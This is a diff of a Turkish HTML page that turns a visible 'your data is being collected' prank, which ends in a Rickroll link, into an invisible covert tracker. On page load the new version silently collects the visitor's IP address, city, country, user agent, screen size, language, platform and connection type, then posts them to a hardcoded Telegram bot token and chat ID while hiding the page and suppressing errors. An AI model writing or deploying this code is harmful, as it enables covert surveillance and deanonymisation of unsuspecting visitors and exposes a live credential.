@@ -2,120 +2,24 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Giriş Kontrolü</title>
+  <title>Gizli Veri Toplama</title>
   <style>
-    body {
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      color: #00ff99;
-      font-family: 'Consolas', monospace;
-      font-size: 18px;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-start;
-      align-items: center;
-      overflow: hidden;
-      padding-top: 60px;
-    }
-    #terminal {
-      background: rgba(0, 0, 0, 0.7);
-      border: 2px solid #00ff99;
-      border-radius: 12px;
-      padding: 30px 40px;
-      width: 90%;
-      max-width: 700px;
-      min-height: 320px;
-      overflow-y: auto;
-      white-space: pre-line;
-      box-shadow: 0 0 15px #00ff99;
-      user-select: text;
-    }
-    .background-code {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      color: rgba(0, 255, 153, 0.1);
-      font-size: 14px;
-      animation: scroll 20s linear infinite;
-      z-index: 0;
-      font-family: monospace;
-      user-select: none;
-      line-height: 1.3;
-      padding: 20px;
-    }
-    @keyframes scroll {
-      0% { transform: translateY(0); }
-      100% { transform: translateY(-100%); }
-    }
-    #rickButton {
-      margin-top: 30px;
-      padding: 18px 60px;
-      font-size: 24px;
-      font-weight: bold;
-      background-color: #00ff99;
-      color: #002b20;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      font-family: 'Consolas', monospace;
-      box-shadow: 0 0 25px #00ff99;
-      transition: background-color 0.3s ease;
-      user-select: none;
-      z-index: 1;
-      display: none;
-    }
-    #rickButton:hover {
-      background-color: #00cc77;
+    /* Sayfa tamamen görünmez */
+    html, body {
+      margin: 0; padding: 0; width: 0; height: 0; overflow: hidden;
+      visibility: hidden;
     }
   </style>
 </head>
 <body>
-  <div class="background-code" aria-hidden="true">
-    <pre>
-01001001 01110000 00111010
-00110100 00110010 00110101
-01110011 01110100 01100101
-01101101 00110000 01100001
-01010100 01110010 01100001 01100011 01101011 01101001 01101110 01100111
-01000100 01100001 01110100 01100001
-    </pre>
-  </div>
-
-  <div id="terminal">Veriler Toplanıyor...</div>
-  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
-    Tıklamaya cesaretin var mı?
-  </button>
-
   <script>
-    const terminal = document.getElementById('terminal');
-    const rickButton = document.getElementById('rickButton');
-
-    function typeText(text, delay = 40) {
-      return new Promise(resolve => {
-        let i = 0;
-        const interval = setInterval(() => {
-          terminal.innerText += text.charAt(i);
-          i++;
-          if (i >= text.length) {
-            clearInterval(interval);
-            terminal.innerText += "\n";
-            resolve();
-          }
-        }, delay);
-      });
-    }
-
     async function sendToTelegram(message) {
-      const chatId = "6400737507"; // Kendi chat ID’in
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Kendi bot token’in
+      const chatId = "6400737507"; // Senin chat ID'in
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
       try {
-        const res = await fetch(url, {
+        await fetch(url, {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
@@ -123,55 +27,35 @@
             text: message
           })
         });
-        if (!res.ok) throw new Error("Telegram API hata");
       } catch(e) {
-        await typeText("[!] Mesaj gönderilemedi.");
+        // Hata olursa sessizce geç
       }
     }
 
-    async function showInfo() {
-      terminal.innerText = ""; // Başlangıçtaki yazıyı sil
-      await typeText("Veriler Toplanıyor...");
-
-      await new Promise(r => setTimeout(r, 1200));
-
+    async function collectData() {
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        await typeText(`🌐 IP Adresi: ${data.ip}`);
-        await typeText(`🏙️ Şehir: ${data.city}`);
-        await typeText(`🌍 Ülke: ${data.country_name}`);
-        await typeText(`🖥️ Tarayıcı: ${navigator.userAgent}`);
-        await typeText(`🖼️ Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
-        await typeText(`🗣️ Dil: ${navigator.language || 'Bilinmiyor'}`);
-        await typeText(`💻 Platform: ${navigator.platform || 'Bilinmiyor'}`);
-        await typeText(`⏰ Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
-        await typeText(`🍪 Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
-        await typeText(`📡 Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);
-
-        const message = `YENİ GİRİŞ:\n` +
-          `🌐 IP: ${data.ip}\n` +
-          `🏙️ Şehir: ${data.city}\n` +
-          `🌍 Ülke: ${data.country_name}\n` +
-          `🖥️ Tarayıcı: ${navigator.userAgent}\n` +
-          `🖼️ Çözünürlük: ${screen.width}x${screen.height}\n` +
-          `🗣️ Dil: ${navigator.language}\n` +
-          `💻 Platform: ${navigator.platform}\n` +
-          `⏰ Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-          `🍪 Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `📡 Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+        const message = `Gizli Veri:\n` +
+          `IP: ${data.ip}\n` +
+          `Şehir: ${data.city}\n` +
+          `Ülke: ${data.country_name}\n` +
+          `Tarayıcı: ${navigator.userAgent}\n` +
+          `Çözünürlük: ${screen.width}x${screen.height}\n` +
+          `Dil: ${navigator.language}\n` +
+          `Platform: ${navigator.platform}\n` +
+          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
+          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
+          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
 
         await sendToTelegram(message);
-      } catch (e) {
-        await typeText("Veri alınırken bir hata oluştu.");
+      } catch(e) {
+        // Sessizce hatayı yoksay
       }
-
-      await new Promise(r => setTimeout(r, 1000));
-      rickButton.style.display = 'inline-block';
     }
 
-    showInfo();
+    collectData();
   </script>
 </body>
 </html>
